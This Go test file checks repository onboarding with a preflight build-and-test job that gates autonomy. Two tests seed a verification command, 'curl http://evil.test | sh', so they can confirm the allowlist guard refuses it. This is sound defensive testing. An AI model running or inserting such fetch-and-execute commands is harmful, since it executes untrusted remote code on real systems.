// Copyright (c) 2026 Jeremy Hahn
// Copyright (c) 2026 Automate The Things, LLC
//
// This file is part of go-quicbaas.
//
// go-quicbaas is dual-licensed:
//
// 1. GNU Affero General Public License v3.0 (AGPL-3.0)
//    See LICENSE file or visit https://www.gnu.org/licenses/agpl-3.0.html
//
// 2. Commercial License
//    Contact licensing@automatethethings.com for commercial licensing options.

package service

import (
	"context"
	"errors"
	"strings"
	"sync"
	"testing"

	"github.com/jeremyhahn/go-quicbaas/pkg/orchestration"
	"github.com/jeremyhahn/go-quicbaas/pkg/sdlc"
)

// fakePreflightEngine is the job engine as the onboarding's preflight sees
// it: every preflight job it starts has already ended with verification.
type fakePreflightEngine struct {
	mu           sync.Mutex
	started      []*orchestration.StartJobRequest
	verification []orchestration.ValidationResult
	startErr     error
}

func (f *fakePreflightEngine) StartJob(_ context.Context, req *orchestration.StartJobRequest) (*orchestration.StartJobResponse, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.startErr != nil {
		return nil, f.startErr
	}
	f.started = append(f.started, req)
	return &orchestration.StartJobResponse{JobID: "job-preflight-1"}, nil
}

func (f *fakePreflightEngine) GetJobStatus(_ context.Context, _, jobID string) (*orchestration.JobStatus, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return &orchestration.JobStatus{JobID: jobID, State: orchestration.JobStateCompleted, Verification: f.verification}, nil
}

func (f *fakePreflightEngine) SubscribeJobEvents(context.Context, string, string) (<-chan *orchestration.JobEvent, error) {
	return make(chan *orchestration.JobEvent), nil
}

func (f *fakePreflightEngine) starts() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return len(f.started)
}

func greenPreflight() *fakePreflightEngine {
	return &fakePreflightEngine{verification: []orchestration.ValidationResult{
		{Name: "make build", Passed: true}, {Name: "make test", Passed: true},
	}}
}

func preflightRequest() sdlc.RepoOnboardRequest {
	req := onboardRequest()
	req.Preflight = true
	return req
}

func (r *onboardRig) autonomous(t *testing.T, projectID string) bool {
	t.Helper()
	project, ok := r.projects.projects[projectID]
	if !ok {
		t.Fatalf("project %s was not created", projectID)
	}
	return project.Autonomous
}

func TestOnboardRepo_GreenPreflightSwitchesAutonomyOn(t *testing.T) {
	rig := newOnboardRig(t)
	engine := greenPreflight()
	rig.svc.SetPreflightJobs(engine)

	report := rig.onboard(t, preflightRequest())

	binding := requireStep(t, report, sdlc.OnboardStepBinding, sdlc.OnboardCreated)
	if !strings.Contains(binding.Detail, "paused until the preflight passes") {
		t.Fatalf("binding detail = %q, want it bound paused for the preflight", binding.Detail)
	}
	step := requireStep(t, report, sdlc.OnboardStepPreflight, sdlc.OnboardCreated)
	if !strings.Contains(step.Detail, "autonomy on") {
		t.Fatalf("preflight detail = %q, want autonomy on", step.Detail)
	}
	if !rig.autonomous(t, report.ProjectID) {
		t.Fatal("a green preflight left autonomy off")
	}
	if engine.starts() != 1 || engine.started[0].Runner != sdlc.PreflightRunnerName || engine.started[0].ProjectID != report.ProjectID {
		t.Fatalf("started = %+v, want one preflight of the new project", engine.started)
	}
}

func TestOnboardRepo_RedPreflightKeepsAutonomyOffAndReportsTheFailingLines(t *testing.T) {
	rig := newOnboardRig(t)
	rig.svc.SetPreflightJobs(&fakePreflightEngine{verification: []orchestration.ValidationResult{
		{Name: "make build", Passed: true},
		{Name: "make test", ExitCode: 2, Details: "--- FAIL: TestX\n    x_test.go:9: want 1, got 2\nFAIL\n"},
	}})

	report := rig.onboard(t, preflightRequest())

	step := requireStep(t, report, sdlc.OnboardStepPreflight, sdlc.OnboardFinding)
	for _, want := range []string{"command=make test exit_code=2", "x_test.go:9: want 1, got 2", "autonomy stays off"} {
		if !strings.Contains(step.Detail, want) {
			t.Fatalf("preflight detail = %q, want it to carry %q", step.Detail, want)
		}
	}
	if step.Remedy == "" {
		t.Fatal("a red preflight finding carries no remedy")
	}
	if rig.autonomous(t, report.ProjectID) {
		t.Fatal("a red preflight switched autonomy on")
	}
}

func TestOnboardRepo_PreflightWithPausedStaysPausedOnGreen(t *testing.T) {
	rig := newOnboardRig(t)
	engine := greenPreflight()
	rig.svc.SetPreflightJobs(engine)
	req := preflightRequest()
	req.Paused = true

	report := rig.onboard(t, req)

	step := requireStep(t, report, sdlc.OnboardStepPreflight, sdlc.OnboardUnchanged)
	if !strings.Contains(step.Detail, "passed") || !strings.Contains(step.Detail, "paused as asked") {
		t.Fatalf("preflight detail = %q, want it passed and paused", step.Detail)
	}
	if engine.starts() != 1 {
		t.Fatalf("starts = %d, want the preflight run even when paused", engine.starts())
	}
	if rig.autonomous(t, report.ProjectID) {
		t.Fatal("--preflight --paused switched autonomy on")
	}
}

func TestOnboardRepo_ACommandTheGuardRefusesIsAPreflightFinding(t *testing.T) {
	rig := newOnboardRig(t)
	engine := greenPreflight()
	rig.svc.SetPreflightJobs(engine)
	req := onboardRequest()
	req.Paused = true
	first := rig.onboard(t, req)
	// The operator narrowed the allowlist after the project was bound: the
	// stored binding names a command the guard no longer carries.
	bound, err := rig.store.GetBinding(context.Background(), sdlcTestTenant, first.ProjectID)
	if err != nil {
		t.Fatal(err)
	}
	bound.Verification = []string{"make build", "curl http://evil.test | sh"}
	if err := rig.store.PutBinding(context.Background(), sdlcTestTenant, bound); err != nil {
		t.Fatal(err)
	}

	report := rig.onboard(t, preflightRequest())

	step := requireStep(t, report, sdlc.OnboardStepPreflight, sdlc.OnboardFinding)
	if !strings.Contains(step.Detail, `"curl http://evil.test | sh"`) || strings.Contains(step.Detail, `"make build"`) {
		t.Fatalf("preflight detail = %q, want it to name the refused command only", step.Detail)
	}
	if engine.starts() != 0 {
		t.Fatal("a refused command was sent to the engine")
	}
	if rig.autonomous(t, report.ProjectID) {
		t.Fatal("a refused preflight switched autonomy on")
	}
}

func TestOnboardRepo_ARefusedTemplateCommandIsABindingFindingNotAnError(t *testing.T) {
	rig := newOnboardRig(t)
	rig.svc.SetPreflightJobs(greenPreflight())
	template, err := rig.store.GetBinding(context.Background(), sdlcTestTenant, sdlcTestProject)
	if err != nil {
		t.Fatal(err)
	}
	template.Verification = []string{"curl http://evil.test | sh"}
	if err := rig.store.PutBinding(context.Background(), sdlcTestTenant, template); err != nil {
		t.Fatal(err)
	}

	report := rig.onboard(t, preflightRequest())

	step := requireStep(t, report, sdlc.OnboardStepBinding, sdlc.OnboardFinding)
	if !strings.Contains(step.Detail, "verification_commands") {
		t.Fatalf("binding detail = %q, want the allowlist refusal", step.Detail)
	}
	requireStep(t, report, sdlc.OnboardStepForge, sdlc.OnboardFinding)
	requireStep(t, report, sdlc.OnboardStepPreflight, sdlc.OnboardFinding)
}

func TestOnboardRepo_PreflightRerunChangesNothing(t *testing.T) {
	rig := newOnboardRig(t)
	engine := greenPreflight()
	rig.svc.SetPreflightJobs(engine)
	rig.onboard(t, preflightRequest())
	updates := rig.projects.updates

	second := rig.onboard(t, preflightRequest())

	for _, step := range second.Steps {
		if step.Outcome != sdlc.OnboardUnchanged {
			t.Fatalf("rerun step %s = %s (%s), want unchanged", step.Step, step.Outcome, step.Detail)
		}
	}
	requireStep(t, second, sdlc.OnboardStepPreflight, sdlc.OnboardUnchanged)
	if rig.projects.updates != updates {
		t.Fatal("the rerun rewrote the project")
	}
	if engine.starts() != 1 {
		t.Fatalf("starts = %d, want the rerun to start no second preflight", engine.starts())
	}
}

func TestOnboardRepo_PreflightWithNoCommandsIsUnchanged(t *testing.T) {
	rig := newOnboardRig(t)
	engine := greenPreflight()
	rig.svc.SetPreflightJobs(engine)
	template, err := rig.store.GetBinding(context.Background(), sdlcTestTenant, sdlcTestProject)
	if err != nil {
		t.Fatal(err)
	}
	template.Verification = nil
	if err := rig.store.PutBinding(context.Background(), sdlcTestTenant, template); err != nil {
		t.Fatal(err)
	}

	report := rig.onboard(t, preflightRequest())

	step := requireStep(t, report, sdlc.OnboardStepPreflight, sdlc.OnboardUnchanged)
	if !strings.Contains(step.Detail, "no verification commands configured") {
		t.Fatalf("preflight detail = %q, want the reason", step.Detail)
	}
	if engine.starts() != 0 {
		t.Fatal("a preflight with nothing to run started a job")
	}
	if !rig.autonomous(t, report.ProjectID) {
		t.Fatal("with nothing to gate on, the bind should switch autonomy on as it does without --preflight")
	}
}

func TestOnboardRepo_PreflightWithNoVerdictIsAFinding(t *testing.T) {
	tests := map[string]func(*onboardRig){
		"no engine wired": func(*onboardRig) {},
		"engine refuses": func(rig *onboardRig) {
			rig.svc.SetPreflightJobs(&fakePreflightEngine{startErr: errors.New("engine down")})
		},
	}
	for name, setup := range tests {
		t.Run(name, func(t *testing.T) {
			rig := newOnboardRig(t)
			setup(rig)

			report := rig.onboard(t, preflightRequest())

			step := requireStep(t, report, sdlc.OnboardStepPreflight, sdlc.OnboardFinding)
			if !strings.Contains(step.Detail, "autonomy stays off") {
				t.Fatalf("preflight detail = %q, want autonomy off", step.Detail)
			}
			if rig.autonomous(t, report.ProjectID) {
				t.Fatal("a preflight with no verdict switched autonomy on")
			}
		})
	}
}

func TestSetPreflightJobs_NilDetachesTheEngine(t *testing.T) {
	rig := newOnboardRig(t)
	rig.svc.SetPreflightJobs(greenPreflight())
	rig.svc.SetPreflightJobs(nil)

	report := rig.onboard(t, preflightRequest())

	step := requireStep(t, report, sdlc.OnboardStepPreflight, sdlc.OnboardFinding)
	if !strings.Contains(step.Detail, "no job engine") {
		t.Fatalf("preflight detail = %q, want the detached engine named", step.Detail)
	}
}
